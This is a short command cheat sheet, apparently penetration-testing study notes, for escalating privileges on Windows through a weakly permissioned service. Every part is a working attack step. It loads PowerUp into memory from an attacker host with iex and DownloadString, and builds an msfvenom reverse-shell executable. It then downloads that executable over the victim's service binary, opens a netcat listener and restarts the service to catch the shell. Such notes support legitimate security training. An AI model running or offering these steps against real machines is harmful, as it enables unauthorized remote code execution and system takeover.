#### Using PowerUp:####
#From Victim Powershell:
iex (New-Object Net.WebClient).DownloadString('http://<IP_ATTACKER>/PowerUp.ps1')
Invoke-AllChecks  ||  Get-ModifiableServiceFile

#From Kali --> Once we have loceted the vulnerable Service:
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP_ATTACKER> LPORT=<PORT> -f exe -o <SERVICE>.exe

#From Victim's Powershell: --> Create a Service's backup just in case
mv <BINARY_PATH>\<SERVICE>.exe .\Backup_<SERVICE>.exe
cd <BINARY_PATH>
iwr -uri http://<IP_ATTACKER>/<SERVICE>.exe -Outfile <SERVICE>.exe

#From Kali:
rlwrap nc -nvlp <PORT>  || penelope <PORT> -i tun0

#From Victim's Powershell:
Restart-Service <SERVICE>
Stop-Service <SERVICE>
Start-Service <SERVICE>
